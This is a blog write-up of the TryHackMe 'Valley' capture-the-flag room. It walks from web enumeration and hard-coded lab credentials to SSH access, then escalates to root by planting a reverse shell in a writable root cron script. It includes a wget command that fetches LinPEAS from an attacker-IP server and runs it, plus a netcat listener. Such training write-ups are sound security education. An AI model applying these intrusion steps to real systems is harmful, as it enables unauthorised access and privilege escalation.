---
title: "TryHackMe - Valley"
categories:
  - Blog
tags:
  - TryHackMe
  - Pentesting
  - Training
---

This is a write-up for the [Valley](https://tryhackme.com/room/valleype) room on [TryHackMe](https://tryhackme.com/).

Let's jump right in!

# Enumeration
First, I performed an nmap scan of the target:
`$ nmap -A <TARGET IP>`

The results show two open ports:
- `22-ssh`
- `80-http`

Next, I ran:
`$ namp -A -p- <TARGET IP>`

I let that run while I did a walkthrough of the web application. 
- I was able to navigate to the following:
    - `/gallery/gallery.html`
        - Each picture in the gallery page opens from `/static/#`, where `#` is the picture's number. There are 18 pictures on the gallery page, numbered 1-18
    - `/pricing/pricing.html`

Next I ran feroxbuster on the target to see if there are any other directories to be found:
`$ feroxbuster -u http://<TARGET IP> -w usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt`

The results of this scan showed:
- `/gallery` `/pricing` and `/static` all returned code `301`, indicating a redirect.
- `/pricing/note.txt`
    - Interesting...

Navigating to `http://<TARGET IP>/pricing/note.txt` we are shown a note from "RP" to "J," asking them to stop leaving notes randomly on the website.

Recalling that the `/static` directory was serving up the gallery photos, identifying them with a numeric value, let's try a different wordlist on this directory, using gobuster for simplicity:
`$ gobuster dir -u http://<TARGET IP>/static -w /usr/share/wordlists/wfuzz/general/big.txt`

This reveals all of the expected gallery pictures (1-18), as well as a page titled `00`.

Navigating to `http://<TARGET IP>/static/00` reveals:
```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```
Alright, another clue. Navigating to `http://<TARGET IP>/dev1243224123123` reveals a login page. Before getting ahead of myself, I decided to check for low hanging fruit. I checked the source of the page and navigated to `dev.js` from there. 

In the source of `dev.js` I found a username and password:
```
if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
```
# Access
I used these credentials to login and was brought to another note:
```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```
Now I checked the results of the `nmap -A -p-` command that I started way back, and found an `ftp` server running on port `37370`.

Drawing on the mention of reusing credentials, I tried to access the `ftp` server with the username and password I found:
`$ ftp <TARGET IP> 37370`

Access was granted and I found 3 `pcapng` files. I used the `get` command to download each file to my machine.

I opened each `pcapng` file in Wireshark, and scanned for anything interesting.
The `siemFTP.pcapng` file contains an Anonymous login to the `ftp` server. 
The `siemHTTP1.pcapng` file is mostly filled with TLS encrypted data. I filtered the data by `http` and did find some traffic in cleartext, but nothing of use. 
I filtered `siemHTTP2.pcapng` by `http` and noticed a `POST` request at packet 2335. After digging into this packet I found more credentials:
`"uname" = "valleyDev"`
`"psw" = "ph0t0s1234"`

I tried using these credentials on the web app login page, and the `ftp` server, but was not successful. So I then pivoted to port 22 running `ssh`:
`$ ssh valleyDev@<TARGET IP>`

Access granted!

Now that we have system access, let's find the first flag. It's right in the current user directory, so just `cat` it out:
`$ cat user.txt`

Now let's look around a bit more. I went back one directory level, to check for other users, and found a file: `valleyAuthenticator`

# Privilege Escalation: Horizontal
I ran `file` command on `valleyAuthenticator`:
`valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header`

I tried executing the file on the target, and was prompted to enter my username and password. I tried all credentials collected thus far, but could not find valid credentials.

I decided to copy the executable back to my local machine, for further analysis:
- End the ssh session, and use `scp` from my local machine
    - `$ scp valleyDev@<TARGET IP>:/home/valleyAuthenticator .`

Now that I have the executable on my machine, I first ran `strings` on it:
`$ strings valleyAuthenticator`

This reveals the string `UPX!` twice at the bottom. [UPX](https://upx.github.io/) is a packer for executibles, which may explain why `strings` returned only gibberish. So next I will unpack the file and try running strings again:
- `$ upx -d valleyAuthenticator`
- `$ strings valleyAuthenticator`
    - Now I am seeing actual human-readable strings, let's try to use `grep` to find any credentials, and I'll use `-B` and `-A` to see more context.
- `$ strings valleyAuthenticator | grep pass -B 10 -A 10`
    - This reveals two hashes that may correlate to the "Username" and "Password" fields below them:
        - `e6722920bab2326f8217e4bf6b1b58ac`
        - `dd2921cc76ee3abfd2beb60709056cfb`

After finding these hashes I turned to [CrackStation](https://crackstation.net/) to try and crack them. This revealed another set of credentials:
- `valley`
- `liberty123`

I tried accessing the system with these credentials over `ssh` and was granted access!

Now let's get `root`.

# Privilege Escalation: Vertical
First I tried running `sudo -l` to see if user `valley` can run anything as sudo, but unfortunately I do not have the ability.
Next, I turned to one of my favorite tools: [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Since I already have `linpeas.sh` on my machine, I navigated to the directory it is located in, and started a Python server on port 9999 using:
`$ python3 -m http.server 9999`

Then, on the target machine, I navigated to the `/tmp` directory, and downloaded `linpeas.sh`:
`$ wget <ATTACKER IP>:9999/linpeas.sh`

Next, I made it executable:
`$ chmod +x linpeas.sh`

And, then executed it:
`$ ./linpeas.sh`

LinPEAS often returns an overwhelming amount of data. Scanning through the results, I found that there is a cronjob running `/photos/script/photosEncrypt.py` every minute, and it is running it as `root`. Further, I have write permission to this script.
I used `nano` to figure out what this script is doing, and it appears to be encrypting any new photos on the system to Base64. 

The technique I will use will be to add a reverse shell to `photosEncrypt.py`. For the script, I used `Python3 Shortest` from [Reverse Shell Generator](https://www.revshells.com/).

Before adding this script to `photosEncrypt.py`, I started a listener on my local machine:
`nc -lvnp 8888`

With my listener running, I pasted the reverse shell into `photosEncrypt.py` and saved the file.

After about a minute, I was granted a shell as `root` on the system. I then navigated to `/root` and finally:
`$ cat root.txt`

# Conclusion
This was an interesting CTF. The engagement began easily enough, with "hidden" notes in a web application, to hard coded credentials, then escalated to more advanced concepts, like unpacking and analyzing executables.

## Suggested Mitigations
The most obvious mitigation for this organization would be to sanitize their web application, removing the notes, as well as the credentials hardcoded into `dev.js`. Beyond this, I would recommend revoking write permission `photosEncrypt.py` all users but `root`.